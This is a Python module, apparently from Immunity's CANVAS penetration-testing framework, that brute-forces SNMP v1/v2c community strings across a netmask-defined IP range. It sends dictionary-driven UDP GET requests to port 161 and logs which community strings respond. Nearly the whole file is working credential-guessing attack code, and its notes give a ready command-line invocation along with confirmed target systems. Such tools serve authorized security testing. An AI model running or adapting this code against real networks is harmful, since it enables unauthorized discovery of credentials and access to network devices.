#!/usr/bin/env python
##ImmunityHeader v1
###############################################################################
## File       :  snmpbrute.py
## Description:
##            :
## Created_On :  Fri Oct 28 CET 2016
## Created_By :  X.
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
###############################################################################

import os
import sys
import socket
import random
import time
import select
import logging

if '.' not in sys.path:
    sys.path.append('.')

NAME                            = 'SNMP v1/v2c - Community discovery'
DESCRIPTION                     = 'Tries to bruteforce the community used by an SNMP service.'
DOCUMENTATION                   = {}
DOCUMENTATION['Date public']    = ''
DOCUMENTATION['Repeatability']  = ''

VERSION                         = '0.1'
PROPERTY                        = {}
PROPERTY['TYPE']                = 'Tools'
PROPERTY['SITE']                = 'Remote'
PROPERTY['ARCH']               = [ ["All"] ]

CHANGELOG = """
"""

NOTES = """
This module performs a simple brute force against a range of IP to detect valid
communities using a dictionary. By default if no dictionary is specified, a small
internal one is used.

Confirmed working against:
    - Ubuntu 16.04
    - Windows 2008

To execute the module from the command line:
python ./exploits/tool/snmpbrute/snmpbrute.py -t $TARGET_IP -Ofilename:$some_dictionary_file -Otimeout:$timeout -Onetmask:$netmask
"""


from canvasexploit import canvasexploit
from exploitutils import *
from libs.pysnmp import v2c, asn1

targets = {
    0: ['Autoversioning', 0],
}

class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.name       = NAME
        self.port       = 161
        self.timeout    = 1
        self.filename   = os.path.abspath(os.path.join(os.path.dirname(__file__), "lists/snmp_dict.txt"))
        self.result     = {}
        self.netmask      = "32"

    def getArgs(self):
        """
        retrieves the arguments
        """
        self.host     = self.target.interface
        self.timeout  = int(self.argsDict.get('timeout', self.timeout))
        self.filename = self.argsDict.get('filename', self.filename)
        self.netmask  = self.argsDict.get("netmask", self.netmask)

        # Specific GUI case
        if not self.filename:
            self.filename   = os.path.abspath(os.path.join(os.path.dirname(__file__), "lists/snmp_dict.txt"))

    def run_on_host(self,target):
        """
        runs once on each host that is alive in the netrange
        """

        community_list=[]
        for community in self.communities:

            community = community.strip()
            req  = v2c.GETREQUEST()
            req['community']    = community
            req['encoded_oids'] = [asn1.OBJECTID('.1.3').encode()]

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = None
            try:
                s.sendto(req.encode(), (target.interface, self.port))
                # An udp socket timeout can't be handled with settimeout.
                # http://stackoverflow.com/questions/2719017/how-to-set-timeout-on-pythons-socket-recv-method
                s.setblocking(0)
                ready = select.select([s], [], [], self.timeout)
                if ready[0]:
                    data = s.recv(4096)
                else:
                    logging.info("Failed attempt with %s on %s [timeout]" % (community, target.interface))
            except Exception as e:
                # Very unlikely
                logging.info("Failed attempt with %s on %s [Err:%s]" % (community, target.interface, str(e)))
            finally:
                s.close()

            if data:
                logging.info("Found community %s for %s" % (community, target.interface))
                community_list += [community]

        if community_list:
            self.result[target.interface] = community_list

        return

    def run(self):
        self.getArgs()

        if isinstance(self.netmask, str):
            self.netmask=int(self.netmask.replace("/",""))

        self.setInfo("%s" % NAME)
        logging.info("Running snmpbrute against %s/%s" % (self.host, self.netmask))

        try:
            self.communities = file(self.filename).readlines()
        except:
            logging.error('Failed to open community file %s' % (self.filename))
            return 0

        self.node=self.argsDict["passednodes"][0]
        dothreads = 'threads' in self.node.capabilities
        self.run_on_all_possible_hosts(threads=dothreads)
        if dothreads:
            logging.info("Recovering from threads")
            time.sleep(self.timeout + 2)

        logging.info("All done")

        for ip in self.result:
            community_list = self.result[ip]
            for c in community_list:
                logging.info(u'%s::Community found: %s' % (ip, c))

        self.setInfo("%s - done (success: %s)" % (NAME, "%d hosts answered" % len(self.result)))
        return 1

if __name__=='__main__':
    app = theexploit()
    ret = standard_callback_commandline(app)
